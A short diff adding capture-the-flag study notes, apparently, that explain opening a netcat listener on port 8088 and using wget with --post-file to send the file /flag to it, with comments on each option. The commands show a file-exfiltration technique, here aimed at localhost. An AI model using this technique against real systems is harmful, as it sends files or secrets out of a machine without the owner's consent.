@@ -111,6 +111,21 @@ as—>a kind of Compiler set
 
 
 
+wget -i flag
+	nc -lnvp 8088 #listeng on the port 8088
+	#-l : Listen mode, for inbound connects
+	#*-n: Suppress name/port resolutions. If there's no -n, error:'nc: getnameinfo: Temporary failure in name resolution'
+	#-v : Shows the execution of instructions
+	#-p : port---Specify local port for remote connects
+
+	wget --post-file=/flag http://127.0.0.1:8088 #another terminal get the flag
+	#--post-file=FILE	use the POST method; send contents of FILE
+
+
+
+
+
+
 
 
 
